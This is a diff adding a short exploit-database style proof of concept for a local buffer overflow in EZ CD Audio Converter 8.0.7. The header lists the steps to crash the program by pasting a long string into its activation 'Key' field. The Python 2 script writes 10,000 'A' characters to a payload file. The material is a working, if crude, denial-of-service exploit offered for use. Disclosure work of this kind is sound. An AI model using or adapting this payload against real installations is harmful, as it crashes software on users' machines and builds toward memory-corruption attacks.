@@ -1,0 +1,28 @@
+# Exploit Title: EZ CD Audio Converter 8.0.7 - Denial of Service (PoC)
+# Date: 2018-12-30
+# Exploit Author: Achilles
+# Vendor Homepage: https://www.poikosoft.com/
+# Software Link : https://download.poikosoft.com/ez_cd_audio_converter_setup_x64.exe
+# Exploit Author: Achilles
+# Tested Version: 8.0.7 (64-bit)
+# Tested on: Windows 7 x64
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+# Steps to Produce the Crash:=20
+# 1.- Run python code : EZ_CD_Audio_Converter.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open EZ_CD_Audio_Converter 'Press Activate'
+# 4.- Paste the content of EVIL.txt into the field: 'Key'
+# 5.- And you will see a crash.
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 10000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
